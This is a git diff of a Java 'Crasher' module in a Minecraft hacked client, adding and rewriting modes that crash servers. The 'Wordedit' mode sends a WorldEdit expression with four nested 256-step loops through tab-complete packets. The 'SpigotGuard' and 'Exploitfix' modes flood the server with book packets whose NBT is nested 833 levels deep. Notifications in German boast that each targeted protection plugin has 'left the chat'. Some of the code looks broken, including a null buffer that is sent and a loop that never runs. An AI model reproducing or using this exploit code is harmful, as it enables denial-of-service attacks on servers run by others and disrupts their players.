@@ -7,8 +7,12 @@ import io.netty.buffer.Unpooled;
 import me.bratwurst.Client;
 import me.bratwurst.event.EventTarget;
 import me.bratwurst.event.events.EventMotionUpdate;
+import me.bratwurst.manager.NotificationManager;
 import me.bratwurst.module.Category;
 import me.bratwurst.module.Module;
+import me.bratwurst.utils.MainUtil;
+import me.bratwurst.utils.Notification;
+import me.bratwurst.utils.NotificationType;
 import me.bratwurst.utils.TimeHelper;
 import me.bratwurst.utils.player.PlayerUtils;
 import net.minecraft.block.Block;
@@ -38,7 +42,7 @@ public class Crasher extends Module {
     public Crasher() {
         super("Crasher", Category.EXPLOIT);
         ArrayList<String> options = new ArrayList<>();
-        options.add("Color");
+        options.add("SpigotGuard");
         options.add("Singlepacket");
         options.add("Fly");
         options.add("Exploitfix");
@@ -57,6 +61,7 @@ public class Crasher extends Module {
         options.add("Multi");
         options.add("Massive");
         options.add("BookFlood");
+        options.add("Wordedit");
         Client.setmgr.rSetting(mode1 = new Setting("Crasher Mode", this, "Singlepacket", options));
     }
 
@@ -78,12 +83,12 @@ public class Crasher extends Module {
         PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "Bypass mode Ativiert", true);
         if (mode1.getValString().equalsIgnoreCase("Singlepacket")) {
             Singlepacket();
-        } else if (mode1.getValString().equalsIgnoreCase("Color")) {
-            ServerCrash();
+        } else if (mode1.getValString().equalsIgnoreCase("SpigotGuard")) {
+            ServerCrash(15000);
         } else if (mode1.getValString().equalsIgnoreCase("Fly")) {
             crypto();
         } else if (mode1.getValString().equalsIgnoreCase("Exploitfix")) {
-            Exploitfix();
+            Exploitfix(15000);
         } else if (mode1.getValString().equalsIgnoreCase("Netty")) {
             Netty();
         } else if (mode1.getValString().equalsIgnoreCase("Mineplex")) {
@@ -116,10 +121,25 @@ public class Crasher extends Module {
             Massiv();
         }else if (mode1.getValString().equalsIgnoreCase("BookFlood")) {
             BookFlood();
+        }else if (mode1.getValString().equalsIgnoreCase("Wordedit")) {
+            Wordedit();
         }
 
 
     }
+    public void Wordedit() {
+
+
+        NotificationManager.show(new Notification(NotificationType.INFO, EnumChatFormatting.AQUA + "WorldEdit hat", "den chat verlassen!", 4));
+
+
+        for(int var5 = 0; var5 < 3; ++var5) {
+            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C14PacketTabComplete("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
+        }
+
+
+    }
+
     public void BookFlood() {
         ItemStack bookStack = new ItemStack(Items.writable_book);
         NBTTagCompound bookCompound = new NBTTagCompound();
@@ -278,23 +298,42 @@ public class Crasher extends Module {
     }
 
 
-    public void ServerCrash() {
-        Minecraft mc = Minecraft.getMinecraft();
-        final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
-        final ItemStack item = new ItemStack(Items.writable_book);
-        final NBTTagCompound nbt = new NBTTagCompound();
-        final NBTTagList pages = new NBTTagList();
-        final NBTTagString page = new NBTTagString(
-                "a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a");
-        for (int i = 0; i < 2; ++i) {
-            pages.appendTag((NBTBase) page);
+    public void ServerCrash(Object... var1) {
+        int var2 = (int) var1[0];
+        long var3 = System.currentTimeMillis();
+        NotificationManager.show(new Notification(NotificationType.INFO, EnumChatFormatting.AQUA + "SpigotGuard hat", " Chat verlassen!", 4));
+
+        for(int var5 = 0; var5 < var2; ++var5) {
+            for(int var6 = 0; var6 < 12000; ++var6) {
+                NBTTagCompound var7 = new NBTTagCompound();
+                NBTTagList var8 = new NBTTagList();
+                StringBuilder var9 = new StringBuilder();
+                var9.append("{");
+                short var10 = 833;
+
+                for(int var11 = 0; var11 < var10; ++var11) {
+                    var9.append("extra:[{");
+                }
+
+                for(int var13 = 0; var13 < var10; ++var13) {
+                    var9.append("text:a}],");
+                }
+
+                var9.append("text:a}");
+                var8.appendTag(new NBTTagString(String.valueOf(var9)));
+                var7.setString("author", mc.thePlayer.getName());
+                var7.setString("title", "GOD CLIENT");
+                var7.setByte("resolved", (byte)1);
+                var7.setTag("pages", var8);
+                ItemStack var12 = new ItemStack(Items.writable_book);
+                var12.setTagCompound(var7);
+                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, var12, 0.0F, 0.0F, 0.0F));
+            }
         }
-        nbt.setTag("pages", (NBTBase) pages);
-        nbt.setTag("author", (NBTBase) new NBTTagString("MEDDL"));
-        nbt.setTag("title", (NBTBase) new NBTTagString("LEUDE"));
-        buffer.writeItemStackToBuffer(item);
-        mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BEdit", buffer));
+
+        toggle();
     }
+
 
     public void crypto() {
         int time = 0;
@@ -373,35 +412,56 @@ public class Crasher extends Module {
     }
 
 
-    public void Exploitfix() {
-        ItemStack book = null;
+    public void Exploitfix(Object... var1 ) {
+        int var2 = (int) var1[0];
+        NBTTagCompound var3 = new NBTTagCompound();
+        NBTTagList var4 = new NBTTagList();
+        StringBuilder var5 = new StringBuilder();
+        var5.append("{");
+        short var6 = 833;
 
-        book = new ItemStack(Items.writable_book);
+        for(int var7 = 0; var7 < var6; ++var7) {
+            var5.append("extra:[{");
+        }
 
-        final NBTTagList list = new NBTTagList();
-        final NBTTagCompound tag = new NBTTagCompound();
-        final String author = mc.getSession().getUsername();
-        final String title = "Meta.exe";
-        final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
-        for (int i = 0; i < 50; ++i) {
-            final NBTTagString tString = new NBTTagString(size);
-            list.appendTag((NBTBase) tString);
+        for(int var12 = 0; var12 < var6; ++var12) {
+            var5.append("text:ſ}],");
         }
-        tag.setString("author", author);
-        tag.setString("title", title);
-        tag.setTag("pages", (NBTBase) list);
-        book.setTagInfo("pages", (NBTBase) list);
-        book.setTagCompound(tag);
-        try {
-            for (int j = 0; j < 4; ++j) {
-                mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(
-                        new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0, mc.thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
-            }
-        } catch (Exception ex) {
-        }
+
+        var5.append("text:ſ}");
+        var4.appendTag(new NBTTagString(String.valueOf(var5)));
+        var3.setString("author", mc.thePlayer.getName());
+        var3.setString("title", "GOD");
+        var3.setByte("resolved", (byte)1);
+        var3.setTag("pages", var4);
+        ItemStack var8 = new ItemStack(Items.writable_book);
+        var8.setTagCompound(var3);
+        PacketBuffer var9 = new PacketBuffer(Unpooled.buffer());
+        var9.writeItemStackToBuffer(var8);
+        long var10 = System.currentTimeMillis();
+        NotificationManager.show(new Notification(NotificationType.INFO, EnumChatFormatting.AQUA + "ExploitFixer hat", " den Chat verlassen!", 3));
+        (new Thread(Crasher::lambdaexecute0)).start();
+        int var98 = 0;
+        PacketBuffer var99 = null;
+        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|BEdit", var99));
+
+
         toggle();
     }
 
+    private static void lambdaexecute0() {
+        int var0 = 0;
+        PacketBuffer var1 = null;
+        try {
+            for(int var2 = 0; var2 < var0; ++var2) {
+                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|BEdit", var1));
+
+            }
+        } catch (Exception e) {
+
+        }
+
+    }
 
     public void Netty() {
         for (int i2 = 0; i2 < 50; ++i2) {
@@ -532,6 +592,8 @@ public class Crasher extends Module {
             buffer.writeItemStackToBuffer(stack);
             Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
         }
+        NotificationManager.show(new Notification(NotificationType.INFO, "GOD", "Mineplex hat den Chat verlassen!", 3));
+
         toggle();
     }
 }
